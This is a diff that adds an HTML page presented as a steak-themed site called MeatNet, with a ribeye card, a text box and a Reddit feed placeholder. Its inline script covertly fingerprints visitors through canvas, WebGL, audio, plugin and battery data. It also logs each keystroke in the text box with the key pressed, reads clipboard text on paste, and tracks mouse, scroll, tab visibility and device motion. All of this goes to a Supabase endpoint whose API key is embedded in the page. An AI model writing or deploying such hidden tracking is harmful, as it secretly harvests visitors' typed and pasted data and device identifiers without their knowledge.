@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MeatNet | Steak Index</title>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f8f1ea;
+      margin: 0;
+      padding: 40px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 2.5em;
+    }
+    .card {
+      max-width: 600px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+      overflow: hidden;
+      padding: 20px;
+    }
+    .card img {
+      width: 100%;
+      border-radius: 12px;
+    }
+    .card h3 {
+      margin-top: 10px;
+    }
+    #reddit {
+      margin-top: 60px;
+      padding: 20px;
+      text-align: center;
+      background: #fff8f3;
+      border-radius: 12px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to MeatNet</h1>
+
+  <div class="card">
+    <img src="https://source.unsplash.com/600x400/?steak" alt="Steak">
+    <h3>Reverse-Seared Ribeye</h3>
+    <p>$28 · Voted #1 by carnivores worldwide</p>
+  </div>
+
+  <input id="trackInput" placeholder="Type something..." style="margin: 20px auto; display: block; padding: 10px; font-size: 1.1em; width: 90%; max-width: 400px;">
+
+  <div id="reddit">
+    <h3>🔥 Latest from r/steak</h3>
+    <div id="reddit-conten">
+      <!-- IFTTT will inject new Reddit content here using webhooks or RSS-to-HTML automation -->
+    </div>
+  </div>
+
+<script>
+(async () => {
+  const sessionId = Math.random().toString(36).substr(2, 9);
+  const supabaseUrl = "https://dnwldhvmobezmhqtxhsg.supabase.co";
+  const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRud2xkaHZtb2Jlem1ocXR4aHNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY1Nzg4MDgsImV4cCI6MjA2MjE1NDgwOH0.PwEJU62JSjDtNrIP9PlTTElWawWhlnTu1pVm7A0bwdA";
+
+  function send(event_type, payload) {
+    fetch(`${supabaseUrl}/rest/v1/tracking_events`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "apikey": supabaseKey,
+        "Authorization": `Bearer ${supabaseKey}`,
+        "Prefer": "return=minimal"
+      },
+      body: JSON.stringify({
+        session_id: sessionId,
+        timestamp: new Date().toISOString(),
+        event_type,
+        payload
+      })
+    });
+  }
+
+  // Passive fingerprinting
+  const payload = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screenRes: `${screen.width}x${screen.height}`,
+    plugins: [...navigator.plugins].map(p => p.name),
+    canvasFP: (() => {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px Arial";
+      ctx.fillText("FlowBoost", 2, 2);
+      return canvas.toDataURL();
+    })()
+  };
+
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    if (dbg) {
+      payload.webgl = {
+        vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+      };
+    }
+  } catch (_) {}
+
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    oscillator.type = "triangle";
+    oscillator.frequency.value = 10000;
+    oscillator.connect(audioCtx.destination);
+    oscillator.start(0);
+    oscillator.stop(0.001);
+    payload.audioFingerprint = audioCtx.sampleRate;
+  } catch (_) {}
+
+  if (navigator.getBattery) {
+    const batt = await navigator.getBattery();
+    payload.battery = {
+      level: batt.level,
+      charging: batt.charging,
+      dischargingTime: batt.dischargingTime
+    };
+  }
+
+  send("fingerprint_init", payload);
+
+  // Scroll tracking
+  let lastScroll = 0;
+  window.addEventListener("scroll", () => {
+    const pos = window.scrollY;
+    const depth = Math.round((pos / (document.body.scrollHeight - window.innerHeight)) * 100);
+    send("scroll_event", { scrollY: pos, scrollDepth: depth, velocity: pos - lastScroll });
+    lastScroll = pos;
+  });
+
+  // Tab visibility
+  document.addEventListener("visibilitychange", () => {
+    send("visibility_change", { state: document.visibilityState });
+  });
+
+  // Keystroke cadence
+  let lastKeyTime = null;
+  const input = document.getElementById("trackInput");
+  input.addEventListener("keydown", e => {
+    const now = performance.now();
+    const delta = lastKeyTime ? now - lastKeyTime : 0;
+    lastKeyTime = now;
+    send("keystroke", { key: e.key, delta });
+  });
+
+  // Clipboard (paste only)
+  input.addEventListener("paste", async () => {
+    const clip = await navigator.clipboard.readText();
+    send("clipboard_paste", { contentSnippet: clip.slice(0, 30), length: clip.length });
+  });
+
+  // Mouse move logging
+  document.addEventListener("mousemove", e => {
+    send("mouse_move", { x: e.clientX, y: e.clientY });
+  });
+
+  // Accelerometer (mobile only)
+  if (window.DeviceMotionEvent) {
+    window.addEventListener("devicemotion", e => {
+      const acc = e.accelerationIncludingGravity;
+      send("motion", { x: acc.x, y: acc.y, z: acc.z });
+    });
+  }
+
+  // Session timer
+  setInterval(() => {
+    send("heartbeat", { uptime_sec: Math.floor(performance.now() / 1000) });
+  }, 10000);
+
+})();
+</script>
+
+</body>
+</html>
